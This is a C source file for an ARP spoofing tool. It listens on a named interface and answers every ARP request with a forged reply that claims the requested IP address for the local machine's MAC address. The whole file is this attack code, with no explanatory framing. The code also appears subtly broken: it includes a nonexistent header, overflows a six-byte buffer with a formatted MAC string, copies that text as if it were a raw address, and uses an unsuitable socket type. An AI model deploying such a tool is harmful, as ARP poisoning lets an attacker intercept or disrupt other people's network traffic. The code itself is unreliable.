#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/error.h>

#define type 2
#define ethernet 1



struct arphdr
{
u_short hw_type; 
u_short proto_type; 
char ha_len; 
char pa_len; 
u_short opcode;
unsigned char source_add[6]; 
unsigned char source_ip[4];
unsigned char dest_add[6]; 
unsigned char dest_ip[4];
};

int main(int argc, char *argv[])
{
int rsock, wsock;
int packetsize = sizeof(struct ether_header) + sizeof(struct arphdr);
char packet[packetsize];
struct ether_header *eth = (struct ether_header *) packet;
struct arphdr *arp = (struct arphdr *)(packet + sizeof(struct ether_header));
unsigned char arppacket[sizeof(struct arphdr) + sizeof(struct ether_header)];
struct ether_header *spoof_eth = (struct ether_header *)arppacket;
struct arphdr *spoof = (struct arphdr *)(arppacket + sizeof(struct ether_header));
struct sockaddr addr;
int one = 1;
struct ifreq iface;
char smac[6];


if((rsock = socket(AF_INET, SOCK_RAW, htons(ETH_P_ARP))) < 0) 
{ 
perror("socket\n"); 
exit(1); 
}

strcpy(iface.ifr_name, argv[1]);

if((ioctl(rsock, SIOCGIFHWADDR, &iface)) < 0)
{
perror("error");
exit(1);
}
else
{
sprintf(smac,"%02x:%02x:%02x:%02x:%02x:%02x",
iface.ifr_hwaddr.sa_data[0] & 0xff, 
iface.ifr_hwaddr.sa_data[1] & 0xff,
iface.ifr_hwaddr.sa_data[2] & 0xff, 
iface.ifr_hwaddr.sa_data[3] & 0xff,
iface.ifr_hwaddr.sa_data[4] & 0xff, 
iface.ifr_hwaddr.sa_data[5] & 0xff);
}
while(1)
{
read(rsock,packet,packetsize);


if((eth->ether_type == 1544) && (arp->opcode == 256))
{

memcpy(spoof_eth->ether_dhost, eth->ether_shost, 6); 
memcpy(spoof_eth->ether_shost, smac, 6); 
spoof_eth->ether_type = htons(ETHERTYPE_ARP);


spoof->hw_type = htons(ethernet); 
spoof->proto_type = htons(ETH_P_IP);
spoof->ha_len = 6;
spoof->pa_len = 4; 
spoof->opcode = htons(type); 
memcpy(spoof->source_add, (char*)ether_aton(smac), 6); 
memcpy(spoof->source_ip, arp->dest_ip, 4); 
memcpy(spoof->dest_add, arp->source_add, 6); 
memcpy(spoof->dest_ip, arp->source_ip, 4); 



strncpy(addr.sa_data, argv[1], sizeof(addr.sa_data));
printf("ARP reply %s is at %s\n", inet_ntoa(*(struct in_addr*)&spoof->source_ip), smac);

if(sendto(rsock, arppacket, packetsize, 0, &addr, sizeof(addr)) < 0)
{
perror("send\n");
exit(1);
}
}
}

return 0;
}
